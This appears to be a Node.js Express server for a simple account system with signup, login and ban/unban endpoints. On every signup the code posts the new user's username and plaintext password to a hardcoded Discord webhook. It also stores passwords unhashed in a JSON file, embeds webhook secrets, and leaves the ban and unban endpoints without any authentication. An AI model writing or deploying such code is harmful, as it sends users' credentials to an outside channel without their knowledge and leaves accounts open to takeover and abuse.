const express = require('express');
const axios = require('axios');
const cors = require('cors');
const fs = require('fs');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const signupWebhook = 'https://discord.com/api/webhooks/1353568401699639307/fXXO9CLV4CX4xQmE948jUHOvfEXh4Qb7IfOJ4RxWVXMpKHDkeZ52ErTpAodWqPva7Jni';
const banWebhook = 'https://discord.com/api/webhooks/1353568170455203903/7gySEuxeFZAhQzR1WSlvemwQOgkCDvkiZVkiPZk10CuupIIzJWsXA_FHEhHQL7jhzlZS';

let users = [];

if (fs.existsSync('./users.json')) {
  users = JSON.parse(fs.readFileSync('./users.json'));
}

function saveUsers() {
  fs.writeFileSync('./users.json', JSON.stringify(users, null, 2));
}

app.post('/signup', async (req, res) => {
  const { username, password } = req.body;
  if (users.find(u => u.username === username)) {
    return res.json({ success: false, message: 'Username already exists!' });
  }

  users.push({ username, password, banned: false });
  saveUsers();

  // Send signup info to Discord webhook
  await axios.post(signupWebhook, {
    content: `🔑 **New User Signed Up:**\n\`\`\`Username: ${username}\nPassword: ${password}\`\`\``,
    components: [{
      type: 1,
      components: [{
        type: 2,
        style: 4, // Red button
        label: 'BAN',
        custom_id: `ban_${username}`
      },{
        type: 2,
        style: 3, // Green button
        label: 'UNBAN',
        custom_id: `unban_${username}`
      }]
    }]
  });

  res.json({ success: true });
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const user = users.find(u => u.username === username && u.password === password);
  
  if (!user) return res.json({ success: false, message: 'Invalid username/password' });
  if (user.banned) return res.json({ success: false, message: 'You have been banned.' });

  res.json({ success: true, message: 'Successfully logged in!' });
});

// Simple endpoints for Discord bot (ban/unban, if used later)
app.post('/ban', (req, res) => {
  const { username } = req.body;
  const user = users.find(u => u.username === username);
  if (user) {
    user.banned = true;
    saveUsers();
    axios.post(banWebhook, { content: `🚫 User **${username}** has been banned.` });
    res.json({ success: true });
  } else res.json({ success: false });
});

app.post('/unban', (req, res) => {
  const { username } = req.body;
  const user = users.find(u => u.username === username);
  if (user) {
    user.banned = false;
    saveUsers();
    axios.post(banWebhook, { content: `✅ User **${username}** has been unbanned.` });
    res.json({ success: true });
  } else res.json({ success: false });
});

app.listen(3000, () => {
  console.log('Server running at http://localhost:3000');
});
